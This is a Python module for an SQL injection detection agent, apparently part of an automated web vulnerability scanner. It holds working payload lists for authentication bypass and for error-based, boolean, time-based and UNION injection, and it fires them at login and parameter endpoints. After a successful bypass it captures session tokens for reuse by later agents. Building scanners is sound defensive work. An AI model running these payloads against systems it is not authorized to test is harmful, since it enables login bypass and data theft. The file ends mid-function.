"""
Enhanced SQL Injection Security Agent - Comprehensive SQLi detection.
"""
from typing import List, Dict, Any, Optional, Tuple
import re
import asyncio
import time
import statistics
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse, parse_qs

from .base_agent import BaseSecurityAgent, AgentResult
from models.vulnerability import Severity, VulnerabilityType
from scoring import VulnerabilityContext, ConfidenceMethod

@dataclass
class TimingBaseline:
    """Stores baseline timing measurements for a target."""
    mean: float
    std_dev: float
    measurements: List[float]

    def is_delayed(self, measurement: float, threshold_std_devs: float = 3.0) -> bool:
        """Check if a measurement represents a significant delay."""
        if self.std_dev == 0:
            return measurement > self.mean * 1.5
        return measurement > (self.mean + threshold_std_devs * self.std_dev)


class SQLInjectionConfig:
    """Configuration constants for SQL Injection testing."""

    # Testing limits
    MAX_ENDPOINTS = 25
    MAX_PARAMS_PER_ENDPOINT = 5
    BASELINE_SAMPLES = 3

    # Timing thresholds
    TIME_DELAY_SECONDS = 5
    MIN_DELAY_CONFIRMATION = 4.0  # Minimum seconds to confirm time-based
    TIMING_THRESHOLD_STD_DEVS = 3.0

    # Similarity thresholds
    BOOLEAN_DIFF_THRESHOLD = 0.15  # 15% content difference for boolean detection

    # Concurrency
    MAX_CONCURRENT_PARAM_TESTS = 3

    # Common login endpoints to test for SQL injection
    LOGIN_ENDPOINTS = [
        "/login",  # Generic login - test first
        "/rest/user/login",  # Juice Shop
        "/api/login",
        "/api/auth/login",
        "/api/v1/login",
        "/auth/login",
        "/user/login",
        "/api/user/login",
        "/api/authenticate",
        "/unauthorized",
        "/api/user/authenticate",
    ]

    # JSON login payloads - credentials with SQL injection
    # delay is defined locally to avoid NameError during class definition
    _delay = 5
    JSON_LOGIN_PAYLOADS = [
        # Classic SQL injection bypass
        {"email": "' OR 1=1--", "password": "anything"},
        {"email": "admin'--", "password": "anything"},
        {"email": "' OR '1'='1'--", "password": "anything"},
        {"email": "admin' OR '1'='1'--", "password": "anything"},
        {"email": "' OR 1=1#", "password": "anything"},
        {"email": "admin'#", "password": "anything"},
        # Username-based login forms
        {"username": "' OR 1=1--", "password": "anything"},
        {"username": "admin'--", "password": "anything"},
        {"user": "' OR 1=1--", "password": "anything"},
        # Time-based blind login payloads (Generic)
        {"email": f"' AND (SELECT 1 FROM (SELECT(SLEEP({_delay})))a)--", "password": "anything"},
        {"username": f"' AND (SELECT 1 FROM (SELECT(SLEEP({_delay})))a)--", "password": "anything"},
        {"email": f"admin' AND SLEEP({_delay})--", "password": "anything"},
        # SQLite heavy query login payloads
        {"username": f"' OR (SELECT count(*) FROM sqlite_master AS A, sqlite_master AS B, sqlite_master AS C) > 0--", "password": "anything"},
        {"email": f"' OR (SELECT count(*) FROM sqlite_master AS A, sqlite_master AS B, sqlite_master AS C) > 0--", "password": "anything"},
        {"username": f"' OR randomblob(10000000) > 0--", "password": "anything"},
    ]


class SQLInjectionAgent(BaseSecurityAgent):
    """
    Comprehensive SQL Injection testing agent.

    Detects:
    - Error-based injection
    - Boolean-based blind injection
    - Time-based blind injection
    - UNION-based injection

    Features:
    - Database-aware payload selection
    - Statistical timing analysis
    - Parallel testing within safety limits
    - Smart payload adaptation
    """

    agent_name = "sql_injection"
    agent_description = "Detects SQL Injection vulnerabilities"
    vulnerability_types = [VulnerabilityType.SQL_INJECTION]

    # SQL injection payloads organized by technique
    ERROR_BASED_PAYLOADS = [
        "'", "\"",
        "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR '1'='1' --", "' OR '1'='1' #",
        "1' ORDER BY 1--", "1' ORDER BY 10--",
        "' UNION SELECT NULL--",
        "') OR ('1'='1",
        "' AND '1'='2",
        "admin'--",
        "' OR 1=1--",
        "' OR 'a'='a",
        "1 AND 1=2 UNION SELECT NULL--",
    ]

    BOOLEAN_PAYLOADS = [
        ("' AND '1'='1", "' AND '1'='2"),  # (true_payload, false_payload)
        ("' OR '1'='1", "' OR '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' AND 'a'='a", "' AND 'a'='b"),
        ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ]

    TIME_BASED_PAYLOADS = {
        "MySQL": [
            f"' AND SLEEP({SQLInjectionConfig.TIME_DELAY_SECONDS})--",
            f"' OR SLEEP({SQLInjectionConfig.TIME_DELAY_SECONDS})--",
            f"1' AND SLEEP({SQLInjectionConfig.TIME_DELAY_SECONDS})--",
        ],
        "PostgreSQL": [
            f"' AND pg_sleep({SQLInjectionConfig.TIME_DELAY_SECONDS})--",
            f"' OR pg_sleep({SQLInjectionConfig.TIME_DELAY_SECONDS})--",
        ],
        "MSSQL": [
            f"'; WAITFOR DELAY '0:0:{SQLInjectionConfig.TIME_DELAY_SECONDS}'--",
            f"' WAITFOR DELAY '0:0:{SQLInjectionConfig.TIME_DELAY_SECONDS}'--",
        ],
        "Oracle": [
            f"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SQLInjectionConfig.TIME_DELAY_SECONDS})--",
        ],
        "SQLite": [
            # Heavy query simulation (approximate delay)
            f"' OR (SELECT count(*) FROM sqlite_master AS A, sqlite_master AS B, sqlite_master AS C) > 0--",
            f"' AND (SELECT count(*) FROM sqlite_master AS A, sqlite_master AS B, sqlite_master AS C) > 0--",
             # Randomblob heavy load
            f"' OR randomblob(10000000) > 0--",
        ],
        "Generic": [
            f"' AND SLEEP({SQLInjectionConfig.TIME_DELAY_SECONDS})--",
            f"'; WAITFOR DELAY '0:0:{SQLInjectionConfig.TIME_DELAY_SECONDS}'--",
        ]
    }

    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
    ]

    # Database-specific advanced payloads
    DB_SPECIFIC_PAYLOADS = {
        "MySQL": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' UNION SELECT NULL,NULL,version()--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
        ],
        "PostgreSQL": [
            "' AND 1=CAST((SELECT version()) AS INT)--",
            "' UNION SELECT NULL,NULL,version()--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        ],
        "MSSQL": [
            "' AND 1=CONVERT(INT,@@version)--",
            "' UNION SELECT NULL,NULL,@@version--",
            "'; IF 1=1 WAITFOR DELAY '0:0:5'--",
        ],
        "Oracle": [
            "' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS INT)--",
            "' UNION SELECT NULL,NULL,banner FROM v$version WHERE ROWNUM=1--",
        ],
    }

    # SQL error patterns (comprehensive)
    SQL_ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL",
        # PostgreSQL
        r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result",
        r"unterminated quoted string", r"syntax error at or near",
        # MSSQL
        r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver", r"Microsoft SQL Native Client",
        r"ODBC SQL Server Driver", r"Unclosed quotation mark",
        # Oracle
        r"\bORA-[0-9]{4,5}\b", r"Oracle.*Driver", r"Warning.*oci_",
        r"quoted string not properly terminated",
        # SQLite
        r"SQLite[/\-\_\ ]*Exception", r"sqlite3\.OperationalError",
        r"SQLITE_ERROR", r"unrecognized token",
        # Generic
        r"sql error", r"database error", r"DB2 SQL error",
        r"[Ss]yntax error", r"[Qq]uoted string",
    ]

    def __init__(self, **kwargs):
        """Initialize SQL Injection agent with compiled patterns."""
        super().__init__(**kwargs)
        self.error_patterns = [
            re.compile(p, re.IGNORECASE | re.MULTILINE)
            for p in self.SQL_ERROR_PATTERNS
        ]
        self.timing_baselines: Dict[str, TimingBaseline] = {}

    async def scan(
            self,
            target_url: str,
            endpoints: List[Dict[str, Any]],
            technology_stack: List[str] = None,
            scan_context: Optional[Any] = None
    ) -> List[AgentResult]:
        """
        Comprehensive SQL injection scan with multiple techniques.

        Args:
            target_url: Base target URL
            endpoints: List of endpoints with parameters
            technology_stack: Detected technologies
            scan_context: Shared context for inter-agent communication

        Returns:
            List of detected vulnerabilities
        """
        results = []
        tech_stack = technology_stack or []

        # Detect database type
        detected_db = self._detect_database_type(tech_stack)
        self.log(f"Detected database: {detected_db or 'Unknown'}")

        # Select payloads based on DB type
        payloads = self._select_payloads(detected_db)
        self.log(f"Using {len(payloads)} payloads for testing")

        # Filter endpoints with parameters
        testable_endpoints = [
            ep for ep in endpoints[:SQLInjectionConfig.MAX_ENDPOINTS]
            if ep.get("params")
        ]

        self.log(f"Testing {len(testable_endpoints)} endpoints with parameters")

        # Test each endpoint
        for idx, endpoint in enumerate(testable_endpoints, 1):
            url = endpoint.get("url", "")
            method = endpoint.get("method", "GET")
            params = endpoint.get("params", {})

            self.log(f"[{idx}/{len(testable_endpoints)}] Testing: {method} {url}")

            # Limit parameters to test
            params_to_test = list(params.keys())[:SQLInjectionConfig.MAX_PARAMS_PER_ENDPOINT]

            # Test each parameter with different techniques
            for param_name in params_to_test:
                # 1. Error-based (fast, high confidence)
                vuln = await self._test_error_based(
                    url, method, params, param_name, payloads, detected_db
                )
                if vuln:
                    results.append(vuln)
                    self._update_scan_context(scan_context, detected_db, "error-based")
                    continue  # Skip other tests if error-based found

                # 2. Boolean-based blind (medium speed)
                vuln = await self._test_boolean_based(
                    url, method, params, param_name, detected_db
                )
                if vuln:
                    results.append(vuln)
                    self._update_scan_context(scan_context, detected_db, "boolean-blind")
                    continue  # Skip time-based if boolean found

                # 3. Time-based blind (slow, last resort)
                vuln = await self._test_time_based(
                    url, method, params, param_name, detected_db
                )
                if vuln:
                    results.append(vuln)
                    self._update_scan_context(scan_context, detected_db, "time-blind")

        # Also test common login endpoints with JSON payloads
        login_results = await self._test_login_endpoints(target_url, scan_context, detected_db)
        results.extend(login_results)

        self.log(f"Scan complete: {len(results)} vulnerabilities found")
        return results

    def _detect_database_type(self, technology_stack: List[str]) -> Optional[str]:
        """Detect database type from technology stack."""
        tech_lower = " ".join(technology_stack).lower()

        db_indicators = {
            "MySQL": ["mysql", "mariadb"],
            "PostgreSQL": ["postgresql", "postgres", "psql"],
            "MSSQL": ["mssql", "sql server", "microsoft sql"],
            "Oracle": ["oracle"],
            "SQLite": ["sqlite"],
        }

        for db_type, indicators in db_indicators.items():
            if any(ind in tech_lower for ind in indicators):
                return db_type

        return None

    def _select_payloads(self, db_type: Optional[str]) -> List[str]:
        """Select appropriate payloads based on database type."""
        payloads = list(self.ERROR_BASED_PAYLOADS)

        # Add DB-specific payloads
        if db_type and db_type in self.DB_SPECIFIC_PAYLOADS:
            payloads.extend(self.DB_SPECIFIC_PAYLOADS[db_type])

        # Add some UNION payloads for discovery
        payloads.extend(self.UNION_PAYLOADS[:3])

        return payloads

    async def _test_login_endpoints(
            self,
            target_url: str,
            scan_context: Optional[Any],
            detected_db: Optional[str]
    ) -> List[AgentResult]:
        """
        Test common login endpoints for SQL injection with JSON payloads.

        This specifically targets authentication bypass vulnerabilities in
        login forms that accept JSON POST requests.

        Args:
            target_url: Base target URL
            scan_context: Shared scan context
            detected_db: Detected database type

        Returns:
            List of detected vulnerabilities
        """
        results = []

        # Parse base URL
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        self.log(f"Testing login endpoints for SQL injection...")

        for login_path in SQLInjectionConfig.LOGIN_ENDPOINTS:
            login_url = urljoin(base_url, login_path)

            # First check if endpoint exists
            try:
                self.log(f"Checking if {login_url} exists...")
                check_response = await self.make_request(login_url, method="POST", json={})
                if check_response is None:
                    self.log(f"Endpoint check failed (No response): {login_url}")
                    continue
                # Skip ONLY if 404 - any other status (including 400, 405, 500) indicates endpoint exists
                if check_response.status_code == 404:
                    self.log(f"Endpoint returned 404: {login_url}")
                    continue
                
                # 405 Method Not Allowed also indicates endpoint exists (might need different method)
                # 400/500 means the endpoint exists but rejected our empty payload
                self.log(f"Endpoint exists (Status {check_response.status_code}): {login_url}")
            except Exception as e:
                self.log(f"Endpoint check exception for {login_url}: {e}")
                continue

            self.log(f"Testing login endpoint: {login_url}")
            
            # Record baseline response time
            baseline_start = time.time()
            baseline_resp = await self.make_request(login_url, method="POST", json={"email": "nonexistent_matrix_user@test.com", "password": "password"})
            baseline_duration = time.time() - baseline_start
            
            # If baseline returns 500, we can still test for time-based/blind injection
            if baseline_resp.status_code == 500:
                self.log(f"Baseline returned 500 for {login_url}, proceeding with blind/time-based checks.")

            # Test each payload with JSON first, falling back to Form Data if needed
            for payload in SQLInjectionConfig.JSON_LOGIN_PAYLOADS:
                # First, try JSON
                try:
                    response = await self.make_request(
                        login_url,
                        method="POST",
                        json=payload,
                        headers={"Content-Type": "application/json"}
                    )
                except Exception as e:
                    self.log(f"JSON payload request failed: {e}")
                    response = None
                    
                # If JSON failed with 500 (parse error), try Form Data
                if response is None or response.status_code == 500:
                    try:
                        response = await self.make_request(
                            login_url,
                            method="POST",
                            data=payload,
                            headers={"Content-Type": "application/x-www-form-urlencoded"}
                        )
                    except Exception as e:
                        self.log(f"Form Data payload request failed: {e}")
                        continue

                if not response:
                    continue

                response_text = response.text.lower()
                response_json = {}
                try:
                    response_json = response.json() if response.text else {}
                except:
                    pass

                # Indicators of successful SQL injection login bypass
                # 1. Response contains authentication token
                has_token = any(k in str(response_json).lower() for k in ['token', 'access', 'jwt', 'session', 'auth'])
                
                # 2. Response status is 200 (success) when it should fail
                is_success = response.status_code == 200
                
                # 3. Time-based detection
                duration = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
                if duration == 0: # Fallback if elapsed not available
                    # This is a bit of a hack since make_request doesn't return timing yet in all cases
                    # but BaseSecurityAgent.make_request should ideally provide this.
                    pass
                
                is_delayed = duration >= SQLInjectionConfig.TIME_DELAY_SECONDS * 0.8
                
                # 4. Check for SQL error (indicates injection point)
                has_sql_error = any(pattern.search(response.text) for pattern in self.error_patterns)
                
                # 5. Response contains user data (bypass worked)
                has_user_data = any(k in str(response_json).lower() for k in ['email', 'user', 'id', 'admin'])

                if has_sql_error:
                    # SQL error found - confirmed injection point
                    return [self.create_result(
                        vulnerability_type=VulnerabilityType.SQL_INJECTION,
                        is_vulnerable=True,
                        severity=Severity.CRITICAL,
                        confidence=self.get_confidence_threshold("high"),
                        detection_method="Error-based (JSON login)",
                        audit_log=["Detected SQL error in response to logical bypass payload in JSON body"],
                        url=login_url,
                        parameter="email/username (JSON body)",
                        method="POST",
                        title="SQL Injection in Login Endpoint (Authentication Bypass)",
                        description=(
                            f"Critical SQL injection vulnerability in login endpoint. "
                            f"The application exposes SQL errors when malicious input is provided. "
                            f"This can allow attackers to bypass authentication entirely."
                        ),
                        evidence=f"Payload: {payload}\nSQL Error in response",
                        remediation=(
                            "1. Use parameterized queries for ALL database operations\n"
                            "2. Never concatenate user input into SQL queries\n"
                            "3. Implement input validation and sanitization\n"
                            "4. Use an ORM with proper SQL escaping\n"
                            "5. Apply least privilege to database accounts"
                        ),
                        owasp_category="A03:2021 – Injection",
                        cwe_id="CWE-89",
                        reference_links=[
                            "https://owasp.org/Top10/A03_2021-Injection/",
                            "https://portswigger.net/web-security/sql-injection"
                        ],
                        request_data={"payload": payload},
                        response_snippet=response.text[:500],
                        vulnerability_context=self._build_sqli_context(
                            url=login_url,
                            method="POST",
                            parameter="email/username (JSON body)",
                            detection_method="error_based",
                            db_type=detected_db,
                            is_auth_bypass=True
                        )
                    )]

                if is_delayed:
                    # Time-based blind injection!
                    return [self.create_result(
                        vulnerability_type=VulnerabilityType.SQL_INJECTION,
                        is_vulnerable=True,
                        severity=Severity.CRITICAL,
                        confidence=self.get_confidence_threshold("medium"),
                        detection_method="Time-based blind (JSON login)",
                        audit_log=[f"Detected significant delay ({duration:.2f}s) in response to time-based payload"],
                        url=login_url,
                        parameter="email/username (JSON body)",
                        method="POST",
                        title="Blind SQL Injection in Login (Time-based)",
                        description=(
                            f"Critical blind SQL injection vulnerability in login endpoint. "
                            f"The application is susceptible to time-based blind injection, "
                            f"allowing attackers to exfiltrate data or bypass authentication by measuring response times."
                        ),
                        evidence=f"Payload: {payload}\nResponse time: {duration:.2f}s (Baseline: {baseline_duration:.2f}s)",
                        remediation=(
                            "1. Use parameterized queries for ALL database operations\n"
                            "2. Never concatenate user input into SQL queries\n"
                            "3. Use a secure authentication framework\n"
                            "4. Implement rate limiting and monitoring"
                        ),
                        owasp_category="A03:2021 – Injection",
                        cwe_id="CWE-89",
                        request_data={"payload": payload},
                        vulnerability_context=self._build_sqli_context(
                            url=login_url,
                            method="POST",
                            parameter="email/username (JSON body)",
                            detection_method="time_based",
                            db_type=detected_db,
                            is_auth_bypass=True
                        )
                    )]

                if is_success and has_token and has_user_data:
                    # Successful authentication bypass!
                    
                    # AUTH CHAINING: Extract and store the token for use by subsequent agents
                    extracted_token = None
                    token_key = None
                    for key in ['token', 'access_token', 'accessToken', 'jwt', 'auth_token', 'authToken']:
                        if key in response_json:
                            extracted_token = response_json[key]
                            token_key = key
                            break
                        # Also check nested 'authentication' or 'data' objects
                        if isinstance(response_json.get('authentication'), dict) and key in response_json['authentication']:
                            extracted_token = response_json['authentication'][key]
                            token_key = f"authentication.{key}"
                            break
                        if isinstance(response_json.get('data'), dict) and key in response_json['data']:
                            extracted_token = response_json['data'][key]
                            token_key = f"data.{key}"
                            break
                    
                    if extracted_token and self.scan_context:
                        self.log(f"Auth chaining: Captured {token_key} from successful SQLi bypass")
                        # Store token for subsequent authenticated requests
                        self.scan_context.mark_authenticated(
                            headers={"Authorization": f"Bearer {extracted_token}"}
                        )
                        self.scan_context.add_session_token(
                            name=token_key or "jwt",
                            value=extracted_token,
                            endpoint=login_url
                        )
                    
                    return [self.create_result(
                        vulnerability_type=VulnerabilityType.SQL_INJECTION,
                        is_vulnerable=True,
                        severity=Severity.CRITICAL,
                        confidence=self.get_confidence_threshold("high"),
                        detection_method="Error-based (JSON login)",
                        audit_log=["Detected SQL error in response to logical bypass payload in JSON body"],
                        url=login_url,
                        parameter="email/username (JSON body)",
                        method="POST",
                        title="SQL Injection Authentication Bypass",
                        description=(
                            f"Critical SQL injection authentication bypass. "
                            f"The login endpoint accepts SQL injection payloads that bypass authentication. "
                            f"An attacker can login as any user without knowing their password."
                        ),
                        evidence=f"Payload: {payload}\nAuthentication token received without valid credentials!",
                        remediation=(
                            "1. Use parameterized queries for ALL database operations\n"
                            "2. Never concatenate user input into SQL queries\n"
                            "3. Implement proper password hashing and verification\n"
                            "4. Use an ORM with proper SQL escaping\n"
                            "5. Apply least privilege to database accounts"
                        ),
                        owasp_category="A03:2021 – Injection",
                        cwe_id="CWE-89",
                        reference_links=[
                            "https://owasp.org/Top10/A03_2021-Injection/",
                            "https://portswigger.net/web-security/sql-injection/lab-login-bypass"
                        ],
                        request_data={"payload": payload},
                        response_snippet=response.text[:500],
                        vulnerability_context=self._build_sqli_context(
                            url=login_url,
                            method="POST",
                            parameter="email/username (JSON body)",
                            detection_method="auth_bypass",
                            db_type=detected_db,
                            is_auth_bypass=True
                        )
                    )]

        return results

    async def _test_error_based(
            self,
            url: str,
            method: str,
            params: Dict[str, Any],
            param_name: str,
            payloads: List[str],
            db_type: Optional[str] = None
    ) -> Optional[AgentResult]:
        """
        Test for error-based SQL injection.

        Injects payloads and looks for SQL error messages in responses.
        """
        original_value = params.get(param_name, "")

        for payload in payloads[:15]:  # Test subset for speed
            test_params = params.copy()
            test_params[param_name] = f"{original_value}{payload}"

            try:
                response = await self.make_request(
                    url, 
                    method=method, 
                    params=test_params if method == "GET" else None,
                    data=test_params if method != "GET" else None
                )
                if not response:
                    continue

                # Check for SQL error patterns
                for pattern in self.error_patterns:
                    match = pattern.search(response.text)
                    if match:
                        error_msg = match.group(0)

                        # Analyze with AI
                        ai_analysis = await self.analyze_with_ai(
                            vulnerability_type="SQL Injection (Error-Based)",
                            context=f"Parameter: {param_name}, Payload: {payload}",
                            response_data=response.text[:1000]
                        )

                        if ai_analysis.get("is_vulnerable", True):
                            # We matched a specific error pattern, so we use SPECIFIC_ERROR (80%)
                            # instead of letting create_result_from_ai cap it at 60%.
                            return self.create_result(
                                is_vulnerable=True,
                                confidence=self.calculate_confidence(ConfidenceMethod.SPECIFIC_ERROR),
                                detection_method="Error-based",
                                ai_analysis=ai_analysis.get("reason", ""),
                                likelihood=ai_analysis.get("likelihood", 0.9),
                                impact=ai_analysis.get("impact", 0.9),
                                exploitability_rationale=ai_analysis.get("exploitability_rationale", ""),
                                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                severity=Severity.CRITICAL,
                                url=url,
                                parameter=param_name,
                                method=method,
                                title=f"SQL Injection (Error-Based) in '{param_name}'",
                                description=(
                                    f"Error-based SQL injection detected in parameter '{param_name}'. "
                                    f"The application exposed database error messages when malicious SQL was injected."
                                ),
                                evidence=f"SQL Error: {error_msg}\nPayload: {payload}",
                                remediation=(
                                    "1. Use parameterized queries (prepared statements)\n"
                                    "2. Never concatenate user input into SQL queries\n"
                                    "3. Implement input validation and sanitization\n"
                                    "4. Use an ORM that handles SQL safely\n"
                                    "5. Apply least privilege to database accounts"
                                ),
                                owasp_category="A03:2021 – Injection",
                                cwe_id="CWE-89",
                                reference_links=[
                                    "https://owasp.org/Top10/A03_2021-Injection/",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                                ],
                                request_data={"params": test_params, "payload": payload},
                                response_snippet=response.text[:500],
                                vulnerability_context=self._build_sqli_context(
                                    url=url,
                                    method=method,
                                    parameter=param_name,
                                    detection_method="error_based",
                                    db_type=db_type
                                )
                            )

            except Exception as e:
                self.log(f"Error testing {param_name}: {str(e)}", level="error")

        return None

    async def _test_boolean_based(
            self,
            url: str,
            method: str,
            params: Dict[str, Any],
            param_name: str,
            db_type: Optional[str] = None
    ) -> Optional[AgentResult]:
        """
        Test for boolean-based blind SQL injection.

        Compares responses between true and false conditions to detect injection.
        """
        original_value = params.get(param_name, "")

        # Get baseline response
        try:
            baseline_response = await self.make_request(
                url, 
                method=method, 
                params=params if method == "GET" else None,
                data=params if method != "GET" else None
            )
            if not baseline_response:
                return None

            baseline_len = len(baseline_response.text)
            baseline_content = baseline_response.text
        except Exception:
            return None

        # Test boolean payload pairs
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            try:
                # Test TRUE condition
                true_params = params.copy()
                true_params[param_name] = f"{original_value}{true_payload}"
                true_response = await self.make_request(
                    url, 
                    method=method, 
                    params=true_params if method == "GET" else None,
                    data=true_params if method != "GET" else None
                )

                if not true_response:
                    continue

                # Test FALSE condition
                false_params = params.copy()
                false_params[param_name] = f"{original_value}{false_payload}"
                false_response = await self.make_request(
                    url, 
                    method=method, 
                    params=false_params if method == "GET" else None,
                    data=false_params if method != "GET" else None
                )

                if not false_response:
                    continue

                # Compare responses
                true_len = len(true_response.text)
                false_len = len(false_response.text)

                # Check if TRUE matches baseline and FALSE differs significantly
                len_diff_ratio = abs(true_len - false_len) / max(true_len, false_len, 1)
                baseline_match = abs(true_len - baseline_len) / max(true_len, baseline_len, 1) < 0.05

                if len_diff_ratio > SQLInjectionConfig.BOOLEAN_DIFF_THRESHOLD and baseline_match:
                    # Verify with second round
                    verify_true = await self.make_request(
                        url, 
                        method=method, 
                        params=true_params if method == "GET" else None,
                        data=true_params if method != "GET" else None
                    )
                    verify_false = await self.make_request(
                        url, 
                        method=method, 
                        params=false_params if method == "GET" else None,
                        data=false_params if method != "GET" else None
                    )

                    if verify_true and verify_false:
                        verify_diff = abs(len(verify_true.text) - len(verify_false.text)) / max(
                            len(verify_true.text), len(verify_false.text), 1
                        )

                        if verify_diff > SQLInjectionConfig.BOOLEAN_DIFF_THRESHOLD:
                            return self.create_result(
                                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                is_vulnerable=True,
                                severity=Severity.CRITICAL,
                                confidence=self.calculate_confidence(ConfidenceMethod.LOGIC_MATCH, confirmation_count=1),
                                detection_method="Boolean-based Blind",
                                audit_log=[f"Detected stable response difference between boolean true/false payloads on parameter '{param_name}'"],
                                url=url,
                                parameter=param_name,
                                method=method,
                                title=f"SQL Injection (Boolean-Based Blind) in '{param_name}'",
                                description=(
                                    f"Boolean-based blind SQL injection detected. The application responds "
                                    f"differently to true vs false SQL conditions, allowing data extraction."
                                ),
                                evidence=(
                                    f"TRUE payload response length: {true_len}\n"
                                    f"FALSE payload response length: {false_len}\n"
                                    f"Difference: {len_diff_ratio:.1%}\n"
                                    f"TRUE payload: {true_payload}\n"
                                    f"FALSE payload: {false_payload}"
                                ),
                                remediation=(
                                    "1. Use parameterized queries exclusively\n"
                                    "2. Implement input validation\n"
                                    "3. Use stored procedures with parameterized inputs\n"
                                    "4. Apply least privilege database permissions"
                                ),
                                owasp_category="A03:2021 – Injection",
                                cwe_id="CWE-89",
                                reference_links=[
                                    "https://portswigger.net/web-security/sql-injection/blind",
                                    "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
                                ],
                                vulnerability_context=self._build_sqli_context(
                                    url=url,
                                    method=method,
                                    parameter=param_name,
                                    detection_method="boolean_blind",
                                    db_type=db_type
                                )
                            )

            except Exception as e:
                self.log(f"Boolean test error on {param_name}: {str(e)}", level="error")

        return None

    async def _test_time_based(
            self,
            url: str,
            method: str,
            params: Dict[str, Any],
            param_name: str,
            db_type: Optional[str]
    ) -> Optional[AgentResult]:
        """
        Test for time-based blind SQL injection with statistical analysis.

        Uses timing delays to detect injection by comparing against baseline.
        """
        # Establish timing baseline
        baseline = await self._establish_timing_baseline(url, method, params)
        if not baseline:
            return None

        # Select appropriate time-based payloads
        payloads = self.TIME_BASED_PAYLOADS.get(
            db_type or "Generic",
            self.TIME_BASED_PAYLOADS["Generic"]
        )

        original_value = params.get(param_name, "")

        for payload in payloads:
            test_params = params.copy()
            test_params[param_name] = f"{original_value}{payload}"

            try:
                start = time.time()
                response = await self.make_request(
                    url, 
                    method=method, 
                    params=test_params if method == "GET" else None,
                    data=test_params if method != "GET" else None,
                    use_cache=False  # Crucial for timing
                )
                elapsed = time.time() - start

                if not response:
                    continue

                # Check if significantly delayed
                if elapsed >= SQLInjectionConfig.MIN_DELAY_CONFIRMATION:
                    if baseline.is_delayed(elapsed, SQLInjectionConfig.TIMING_THRESHOLD_STD_DEVS):
                        # Verify with second attempt
                        verify_start = time.time()
                        verify_response = await self.make_request(
                            url, 
                            method=method, 
                            params=test_params if method == "GET" else None,
                            data=test_params if method != "GET" else None,
                            use_cache=False
                        )
                        verify_elapsed = time.time() - verify_start

                        if verify_elapsed >= SQLInjectionConfig.MIN_DELAY_CONFIRMATION:
                            return self.create_result(
                                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                is_vulnerable=True,
                                severity=Severity.CRITICAL,
                                confidence=self.calculate_confidence(ConfidenceMethod.CONFIRMED_EXPLOIT),
                                detection_method="Time-based Blind",
                                audit_log=[f"Detected consistent response delay (> {SQLInjectionConfig.MIN_DELAY_CONFIRMATION}s) for time-delay payloads on parameter '{param_name}'"],
                                url=url,
                                parameter=param_name,
                                method=method,
                                title=f"SQL Injection (Time-Based Blind) in '{param_name}'",
                                description=(
                                    f"Time-based blind SQL injection detected. The application "
                                    f"response was artificially delayed when time-delay SQL functions "
                                    f"were injected, confirming SQL execution."
                                ),
                                evidence=(
                                    f"Baseline response time: {baseline.mean:.2f}s ± {baseline.std_dev:.2f}s\n"
                                    f"Injected response time: {elapsed:.2f}s\n"
                                    f"Verification time: {verify_elapsed:.2f}s\n"
                                    f"Payload: {payload}"
                                ),
                                remediation=(
                                    "1. Use parameterized queries (prepared statements)\n"
                                    "2. Implement strict input validation\n"
                                    "3. Use database query timeouts\n"
                                    "4. Apply least privilege principles\n"
                                    "5. Consider using stored procedures"
                                ),
                                owasp_category="A03:2021 – Injection",
                                cwe_id="CWE-89",
                                reference_links=[
                                    "https://portswigger.net/web-security/sql-injection/blind",
                                    "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
                                ],
                                request_data={"payload": payload, "delay": SQLInjectionConfig.TIME_DELAY_SECONDS},
                                vulnerability_context=self._build_sqli_context(
                                    url=url,
                                    method=method,
                                    parameter=param_name,
                                    detection_method="time_blind",
                                    db_type=db_type
                                )
                            )

            except Exception as e:
                self.log(f"Time-based test error on {param_name}: {str(e)}", level="error")

        return None

    async def _establish_timing_baseline(
            self,
            url: str,
            method: str,
            params: Dict[str, Any]
    ) -> Optional[TimingBaseline]:
        """
        Establish baseline timing by making multiple normal requests.

        Returns:
            TimingBaseline with mean and std deviation, or None if failed
        """
        measurements = []

        for _ in range(SQLInjectionConfig.BASELINE_SAMPLES):
            try:
                start = time.time()
                response = await self.make_request(
                    url, 
                    method=method, 
                    params=params if method == "GET" else None,
                    data=params if method != "GET" else None,
                    use_cache=False
                )
                elapsed = time.time() - start

                if response:
                    measurements.append(elapsed)
            except Exception:
                continue

        if len(measurements) < 2:
            return None

        mean = statistics.mean(measurements)
        std_dev = statistics.stdev(measurements) if len(measurements) > 1 else 0

        return TimingBaseline(
            mean=mean,
            std_dev=std_dev,
            measurements=measurements
        )

    def _build_sqli_context(
            self,
            url: str,
            method: str,
            parameter: str,
            detection_method: str,
            db_type: Optional[str] = None,
            is_auth_bypass: bool = False
    ) -> VulnerabilityContext:
        """Build vulnerability context for SQL injection findings."""
        path = urlparse(url).path
        
        # Default impacts for SQL injection
        data_exposed = ["database"]
